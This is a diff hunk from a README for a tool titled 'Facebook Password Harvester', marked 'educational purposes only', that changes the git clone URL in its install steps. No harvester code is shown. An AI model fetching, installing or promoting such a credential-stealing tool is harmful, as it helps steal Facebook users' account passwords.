@@ -3,7 +3,7 @@ Facebook Password Harvester **Use this for educational purposes only.**
 
 ## Install
 ```bash
-git clone https://github.com/x9zr3/nemesis
+git clone https://github.com/zayli/nemesis
 cd nemesis
 ```
 
